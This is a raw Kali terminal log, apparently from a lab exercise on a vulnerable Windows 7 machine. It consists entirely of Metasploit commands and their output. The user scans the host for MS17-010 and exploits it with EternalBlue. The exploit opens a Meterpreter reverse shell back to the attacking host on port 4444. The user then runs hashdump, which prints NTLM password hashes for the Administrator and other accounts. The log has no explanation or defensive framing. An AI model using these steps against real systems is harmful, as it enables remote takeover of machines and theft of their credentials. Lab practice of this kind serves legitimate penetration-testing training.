┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH]
└─# msfconsole
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |                                                                                                  
  +---------------------------+---------------------------+                                                                                                  
  |      __________________   |                           |                                                                                                  
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                  
  |             )=\           | |  EXPLOIT   \            |                                                                                                  
  |            // \\          | |_____________\_______    |                                                                                                  
  |           //   \\         | |==[msf >]============\   |                                                                                                  
  |          //     \\        | |______________________\  |                                                                                                  
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                  
  |        //         \\      |  *********************    |                                                                                                  
  +---------------------------+---------------------------+                                                                                                  
  |      o O o                |        \'\/\/\/'/         |                                                                                                  
  |              o O          |         )======(          |                                                                                                  
  |                 o         |       .'  LOOT  '.        |                                                                                                  
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                  
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                  
  | |________________|__|)__| |    |     __||_)     |     |                                                                                                  
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                  
  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                  
  +---------------------------+---------------------------+                                                                                                  


       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Set the current module's RHOSTS with 
database values using hosts -R or services 
-R                                                                                                                                                           
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                Required  Description
   ----         ---------------                                --------  -----------
   CHECK_ARCH   true                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                s/named_pipes.txt
   RHOSTS                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                                                         sing-metasploit.html
   RPORT        445                                            yes       The SMB service port (TCP)
   SMBDomain    .                                              no        The Windows domain to use for authentication
   SMBPass                                                     no        The password for the specified username
   SMBUser                                                     no        The username to authenticate as
   THREADS      1                                              yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.1.4
RHOST => 192.168.1.4
msf6 auxiliary(scanner/smb/smb_ms17_010) > set threads 16
threads => 16
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[-] 192.168.1.4:445       - Rex::HostUnreachable: The host (192.168.1.4:445) was unreachable.
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.1.4:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.5
RHOST => 192.168.1.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.4
RHOST => 192.168.1.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.5:4444 
[*] 192.168.1.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.4:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.4:445 - The target is vulnerable.
[*] 192.168.1.4:445 - Connecting to target for exploitation.
[+] 192.168.1.4:445 - Connection established for exploitation.
[+] 192.168.1.4:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.4:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.4:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.1.4:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.1.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.4:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.4:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.4:445 - Starting non-paged pool grooming
[+] 192.168.1.4:445 - Sending SMBv2 buffers
[+] 192.168.1.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.4:445 - Sending final SMBv2 buffers.
[*] 192.168.1.4:445 - Sending last fragment of exploit packet!
[*] 192.168.1.4:445 - Receiving response from exploit packet
[+] 192.168.1.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.4:445 - Sending egg to corrupted connection.
[*] 192.168.1.4:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.1.4
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.4:49159) at 2023-09-13 13:54:17 -0400
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

